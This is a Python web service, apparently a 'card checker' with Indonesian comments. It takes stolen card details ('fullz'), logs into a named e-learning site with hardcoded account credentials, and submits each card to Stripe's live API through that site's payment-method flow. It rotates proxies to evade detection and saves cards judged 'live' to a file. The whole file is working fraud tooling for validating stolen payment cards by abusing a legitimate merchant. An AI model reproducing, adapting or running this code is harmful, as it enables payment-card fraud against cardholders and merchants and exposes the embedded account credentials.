import asyncio
import random
import time
import json
import pathlib
from aiohttp import web
import httpx
from html import unescape
from bs4 import BeautifulSoup


def load_proxies_from_file(filename="proxy.txt"):
    proxies = []
    try:
        with open(filename, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                parts = line.split(":")
                if len(parts) == 4:
                    ip, port, user, password = parts
                    proxy_url = f"http://{user}:{password}@{ip}:{port}"
                    proxies.append(proxy_url)
                else:
                    print(f"Proxy format error (harus ip:port:user:pass): {line}")
    except FileNotFoundError:
        print(f"File {filename} tidak ditemukan.")
    return proxies


def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None


def map_error_message(result: str) -> str:
    lower_result = result.lower()

    live_errors = [
        'insufficient funds',
        'your card has insufficient funds.',
        'your card does not support this type of purchase.',
        'ccn live',
        'transaction not allowed',
        'three_d_secure_redirect',
        'card_error_authentication_required',
        '3d challenge required',
        'invalid cvc',
        "card's security code is invalid",
        "card’s security code is incorrect",
        "card's security code or expiration date is incorrect"
    ]

    if 'that username is already taken' in lower_result:
        return 'Username Already Taken ❌'

    for err in live_errors:
        if err in lower_result:
            if 'invalid cvc' in lower_result:
                return "Invalid CVC ❎"
            if 'customer authentication is required to complete this transaction. please complete the verification steps issued by your payment provider.' in lower_result:
                return "3D Challenge Required ❎"
            if 'insufficient funds' in lower_result or 'your card has insufficient funds.' in lower_result:
                return "Insufficient Funds ❎"
            if 'your card does not support this type of purchase.' in lower_result:
                return "Card does not support this type of purchase ❎"
            return result + " ❎"

    error_mappings = {
        'incorrect_cvc': 'CCN Live ❎',  # dianggap live juga
        'generic_decline': 'Generic Declined 🚫',
        'do not honor': 'Do Not Honor 🚫',
        'fraudulent': 'Fraudulent 🚫',
        'setup_intent_authentication_failure': 'Setup Intent Authentication Failure 🚫',
        'stolen card': 'Stolen Card 🚫',
        'lost_card': 'Lost Card 🚫',
        'pickup_card': 'Pickup Card 🚫',
        'your card number is incorrect.': 'Incorrect Card Number 🚫',
        'your card number is invalid.': 'Incorrect Card Number 🚫',
        'incorrect_number': 'Incorrect Card Number 🚫',
        'expired_card': 'Expired Card 🚫',
        'captcha required': 'Captcha Required 🚫',
        'invalid expiry year': 'Expiration Year Invalid 🚫',
        'invalid expiry month': 'Expiration Month Invalid 🚫',
        'invalid account': 'Dead card 🚫',
        'invalid api key provided': 'Stripe api key invalid 🚫',
        'testmode_charges_only': 'Stripe testmode charges only 🚫',
        'api_key_expired': 'Stripe api key expired 🚫',
        'your account cannot currently make live charges.': 'Stripe account cannot currently make live charges 🚫',
        'your card was declined.': 'Your card was declined 🚫',
    }

    for key, val in error_mappings.items():
        if key in lower_result:
            return val

    return result


def validate_luhn(card_number: str) -> bool:
    """Validasi nomor kartu menggunakan algoritma Luhn."""
    def digits_of(n):
        return [int(d) for d in n if d.isdigit()]
    
    digits = digits_of(card_number)
    if not digits:
        return False

    checksum = 0
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]

    checksum += sum(odd_digits)
    for d in even_digits:
        doubled = d * 2
        if doubled > 9:
            doubled -= 9
        checksum += doubled

    return checksum % 10 == 0


async def create_payment_method(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")

        # Validasi nomor kartu dengan algoritma Luhn
        if not validate_luhn(cc):
            return "Incorrect Card Number"

        # FORMAT dan VALIDASI MASA BERLAKU KARTU
        mes = mes.zfill(2)
        try:
            expiry_month = int(mes)
        except ValueError:
            return "Expiration Month Invalid"

        if expiry_month < 1 or expiry_month > 12:
            return "Expiration Month Invalid"

        # Konversi tahun ke 4 digit jika 2 digit, dan validasi
        if len(ano) == 2:
            expiry_year = 2000 + int(ano)
        elif len(ano) == 4:
            expiry_year = int(ano)
        else:
            return "Expiration Year Invalid"

        current_year = int(time.strftime("%Y"))
        current_month = int(time.strftime("%m"))

        if expiry_year < current_year:
            return "Expiration Year Invalid"
        elif expiry_year == current_year and expiry_month < current_month:
            return "Expiration Month Invalid"

        # ==== Lanjutan kode asli tanpa perubahan ====

        # Contoh data acak user; sesuaikan jika perlu
        firstname = "renan" + str(random.randint(9999, 574545))
        lastname = "senom" + str(random.randint(9999, 574545))
        user = "rensen" + str(random.randint(9999, 574545))
        mail = "rensen" + str(random.randint(9999, 574545)) + "@gmail.com"
        pwd = "Rensen" + str(random.randint(9999, 574545)) + "#&$+"

        headers1 = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Referer': 'https://elearntsg.com/members/parael10/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        response = await session.get('https://elearntsg.com/login/', headers=headers1)

        login_token = gets(response.text, '"learndash-login-form" value="', '" />')
        if not login_token:
            return "Failed to get login token"

        headers2 = headers1.copy()
        headers2.update({
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://elearntsg.com',
            'Referer': 'https://elearntsg.com/login/',
        })

        data_login = {
            'learndash-login-form': login_token,
            'pmpro_login_form_used': '1',
            'log': 'parael10@gmail.com',
            'pwd': 'parael',
            'wp-submit': 'Log In',
            'redirect_to': '',
        }

        response = await session.post('https://elearntsg.com/wp-login.php', headers=headers2, data=data_login)

        for url in [
            'https://elearntsg.com/activity-feed/',
            'https://elearntsg.com/my-account/payment-methods/',
            'https://elearntsg.com/my-account/add-payment-method/'
        ]:
            response = await session.get(url, headers=headers1)

        nonce = gets(response.text, '"add_card_nonce":"', '"')
        if not nonce:
            return "Failed to get add_card_nonce"

        headers_stripe = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        data_stripe = {
            'type': 'card',
            'billing_details[name]': f'{firstname} {lastname}',
            'billing_details[email]': mail,
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': str(expiry_month),
            'card[exp_year]': str(expiry_year),
            'guid': '6fd3ed29-4bfb-4bd7-8052-53b723d6a6190f9f90',
            'muid': '6a88dcf2-f935-4ff8-a9f6-622d6f9853a8cc8e1c',
            'sid': '6993a7fe-704a-4cf9-b68f-6684bf728ee6702383',
            'payment_user_agent': 'stripe.js/983ed40936; stripe-js-v3/983ed40936; split-card-element',
            'referrer': 'https://elearntsg.com',
            'time_on_page': '146631',
            'client_attribution_metadata[client_session_id]': '026b4312-1f75-4cd9-a40c-456a8883e56c',
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'card-element',
            'client_attribution_metadata[merchant_integration_version]': '2017',
            'key': 'pk_live_HIVQRhai9aSM6GSJe9tj2MDm00pcOYKCxs',
        }

        response = await session.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data_stripe)

        try:
            id = response.json()['id']
        except Exception:
            return response.text

        headers_ajax = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://elearntsg.com',
            'Referer': 'https://elearntsg.com/my-account/add-payment-method/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        params = {
            'wc-ajax': 'wc_stripe_create_setup_intent',
        }

        data_ajax = {
            'stripe_source_id': id,
            'nonce': nonce,
        }

        response = await session.post('https://elearntsg.com/', params=params, headers=headers_ajax, data=data_ajax)

        html_text = response.text
        soup = BeautifulSoup(html_text, 'html.parser')
        paid_tag = soup.find("span", class_="pmpro_list_item_value pmpro_tag pmpro_tag-success")

        status_paid = False
        if paid_tag and paid_tag.text.strip().lower() == "paid":
            status_paid = True

        return {"html": html_text, "paid": status_paid}

    except Exception as e:
        return str(e)


async def charge_resp(result):
    try:
        result_str = result if isinstance(result, str) else str(result)
        lower_result = result_str.lower()

        success_keywords = [
            '{"status":"SUCCESS",',
            '"status":"success"',
            "succeeded", "success", "charge succeeded",
            "payment_intent succeeded", "paid",
            "payment successful", "payment complete",
            "payment processed", "payment confirmation",
            "approved", "transaction complete",
            "transaction approved", "card charged",
            "charge complete", "payment received",
            "authorization succeeded", "captured",
            "payment accepted", "payment authorized",
            "payment processed successfully"
        ]

        if any(k in lower_result for k in success_keywords):
            return "Payment method successfully added ✅"
        elif "thank you for your donation" in lower_result:
            return "Payment successful! 🎉"

        mapped = map_error_message(result_str)
        if mapped != result_str:
            return mapped

        return result_str + " 🚫"

    except Exception as e:
        return f"{str(e)} 🚫"


async def multi_checking(fullz, proxies):
    start = time.time()
    if not proxies:
        return "No proxies loaded."

    proxy = random.choice(proxies)

    async with httpx.AsyncClient(timeout=40, proxy=proxy) as session:
        result = await create_payment_method(fullz, session)
        response = await charge_resp(result)
    elapsed = round(time.time() - start, 2)

    error_message = ""
    try:
        html_content = result["html"] if isinstance(result, dict) else result
        json_resp = json.loads(html_content)
        if "error" in json_resp:
            error_message = unescape(json_resp["error"].get("message", "")).strip()
    except Exception:
        try:
            soup = BeautifulSoup(result["html"] if isinstance(result, dict) else result, 'html.parser')
            error_div = soup.find('div', {'id': 'pmpro_message_bottom'})
            if error_div:
                error_message = error_div.get_text(strip=True)
        except Exception:
            pass

    if error_message:
        mapped_error = map_error_message(error_message)
        if "❎" not in mapped_error and "✅" not in mapped_error and "🚫" not in mapped_error:
            mapped_error += " 🚫"
        if mapped_error == "3D Challenge Required ❎":
            return f"{fullz}\n3D Challenge Required ❎ {elapsed}s"
        else:
            return f"{fullz} {mapped_error} {elapsed}s"

    if response == "3D Challenge Required ❎":
        return f"{fullz}\n3D Challenge Required ❎ {elapsed}s"

    resp = f"{fullz} {response} {elapsed}s"

    if any(keyword in response for keyword in [
        "Payment method successfully added ✅",
        "CCN Live ❎", "CVV LIVE ❎",
        "Insufficient Funds ❎",
        "Card does not support this type of purchase ❎",
        "Transaction not allowed ❎",
        "3D Challenge Required ❎",
        "Invalid CVC ❎"
    ]):
        with open("charge.txt", "a", encoding="utf-8") as file:
            file.write(resp + "\n")

    return resp


async def check_card(request):
    try:
        data = await request.json()
    except Exception:
        return web.json_response({"error": "Invalid JSON body"}, status=400)

    cc = data.get("cc")
    if not cc:
        return web.json_response({"error": "Missing 'cc' field"}, status=400)

    proxies = request.app.get("proxies", [])

    try:
        result = await multi_checking(cc, proxies)
        return web.json_response({"result": result})
    except Exception as e:
        return web.json_response({"error": str(e)}, status=500)


async def index(request):
    path = pathlib.Path(__file__).parent / "index.html"
    return web.FileResponse(path)


async def init_app():
    app = web.Application()
    app["proxies"] = load_proxies_from_file("proxy.txt")
    app.router.add_get("/", index)
    app.router.add_post("/check-card", check_card)
    return app


if __name__ == "__main__":
    app = asyncio.run(init_app())
    web.run_app(app, host="0.0.0.0", port=8080)
